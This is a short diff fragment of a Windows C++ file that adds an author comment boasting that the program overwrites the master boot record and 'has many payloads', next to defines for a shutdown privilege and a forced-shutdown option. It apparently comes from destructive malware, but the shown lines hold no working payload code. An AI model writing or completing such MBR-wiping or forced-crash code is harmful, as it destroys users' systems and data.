@@ -1,5 +1,6 @@
 #include <Windows.h>
 #include <ntstatus.h>
+//written by Maruf in C++ hey but be careful it also overwrites the mbr! and has many payloads! enjoy.........
 
 #define SHUTDOWN_PRIVILEGE 19
 #define OPTION_SHUTDOWN 6
